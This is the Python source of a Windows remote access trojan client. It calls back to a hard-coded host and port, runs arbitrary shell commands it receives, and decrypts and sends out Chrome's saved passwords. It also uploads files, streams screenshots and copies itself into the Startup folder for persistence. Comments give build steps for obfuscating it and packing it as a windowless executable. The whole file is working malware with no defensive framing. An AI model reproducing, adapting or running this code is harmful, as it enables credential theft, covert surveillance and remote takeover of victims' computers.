import socket,json,os,base64,threading,sqlite3,win32crypt,shutil,sys,ctypes,psutil
from time import sleep
from io import BytesIO
from subprocess import Popen, PIPE
from Crypto.Cipher import AES
from PIL import ImageGrab
'''
Pillow
pycryptodome 
pypiwin32
pywin32
intensio_obfuscator -i obfusc -o obfuscout -ind 4 -rts -rth -mlen high
pyinstaller --onefile --noconsole client.py
python Desktop\client.py
'''
ip = '192.168.1.105'
port = 4444
BUFFER_SIZE = 1024
SEPARATOR = "<SEPARATOR>"

def chromepass_decrypt(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome version < 80"

def chromepass():
	credentials = {}
	with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
  		local_state = f.read()
  		local_state = json.loads(local_state)
	master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	master_key = master_key[5:]
	master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
	login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
	shutil.copy2(login_db, "Loginvault.db")
	conn = sqlite3.connect("Loginvault.db")
	cursor = conn.cursor()
	cursor.execute("SELECT action_url, username_value, password_value FROM logins")
	for r in cursor.fetchall():
		url = r[0]
		username = r[1]
		decrypted_password = chromepass_decrypt(r[2], master_key)
		if decrypted_password == "Chrome version < 80":
			credentials = decrypted_password
			break
		credentials[url] = (username, decrypted_password)
	json_send(credentials)
	cursor.close()
	conn.close()
	os.remove("Loginvault.db")

def send_file(filename):
	if os.path.isfile(filename):
		json_send(True)
		filesize = os.path.getsize(filename)
		json_send(f"{filename}{SEPARATOR}{filesize}")
		byte_file = open(filename, 'rb')
		json_send(base64.b64encode(byte_file.read()).decode('utf-8'), 52428800)
		byte_file.close()
	else:
		json_send(False)

def stream():
	global udp_s
	udp_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while True:
		try:
			if not stream_on:
				break
			sleep(1)
			image = ImageGrab.grab()
			im_resize = image.resize((1000, 700))
			buf = BytesIO()
			im_resize.save(buf, format='JPEG')
			byte_im = buf.getvalue()
			json_send(base64.b64encode(byte_im).decode('utf-8'), BUFFER_SIZE, "udp")
		except: pass
	udp_s.close()
	del udp_s

def json_send(data, buff = 1024, protocol = "tcp"):
	multiplier = 1;
	json_data = bytes(base64.b64encode(json.dumps(data).encode('utf-8')).decode('utf-8'), 'utf-8')[:buff]
	if protocol == "tcp":
		s.send(json_data)
	else:
		udp_s.sendto(json_data, (ip, port+1))
	while json_data:
		json_data = bytes(base64.b64encode(json.dumps(data).encode('utf-8')).decode('utf-8'), 'utf-8')[multiplier*buff:(multiplier+1)*buff]
		if protocol == "tcp":
			s.send(json_data)
		else: # udp
			udp_s.sendto(json_data, (ip, port+1))
		multiplier += 1
		if buff != 1024:
			sleep(5)

def json_recv():
	data = b''
	while True:
		try:
			data = data + base64.b64decode(s.recv(BUFFER_SIZE))
			return json.loads(data)
		except ValueError:
			continue

def cmd():
	global stream_on
	stream_on = False
	activate = json_recv()
	if activate:
		who = Popen("whoami", shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
		whoami = who.stdout.read() + who.stderr.read()
		fwd = os.getcwd()
		init = [whoami.decode('utf-8'), fwd]
		json_send(init)
		while True:
			command = json_recv()
			if command == "PausepppPAUSE1234":
				if stream_on:
					stream_on = False
					sleep(0.1)
					streaming_thread.join()
				break

			elif command[:3] == "cd " and len(command)>3:
				if os.path.exists(command[3:]):
					os.chdir(command[3:])
					json_send(True)
				else: 
					json_send(False)
				wd = os.getcwd()
				json_send(wd)

			elif command[:3] == "-d " and len(command)>3:
				send_file(command[3:])

			elif command == "-chromepass":
				try:
					chromepass()
				except:
					json_send("No Chrome...")

			elif command == "-stream":
				stream_on = True
				streaming_thread = threading.Thread(target=stream)
				streaming_thread.start()

			elif command == "-stop_stream":
				stream_on = False
				sleep(0.1)
				streaming_thread.join()

			else:
				proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				json_send(result.decode('utf-8'))
		cmd()

def connection():
	global s
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				s.connect((ip,port))
				cmd()
				s.close()
				sleep(5)
			except:
				s.close()
				sleep(5)
		except KeyboardInterrupt:
			break

def set_startup():
	process = "client.exe"
	for proc in psutil.process_iter():
		if process in proc.name():
			file = proc.cmdline()[0]
			startup_dir = os.environ["appdata"] + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
			if file == startup_dir + process:
				return True
			if not os.path.isfile(startup_dir + process):
				shutil.copyfile(file, startup_dir + process)
				sleep(20)
				return True
	return False

#if set_startup():
connection()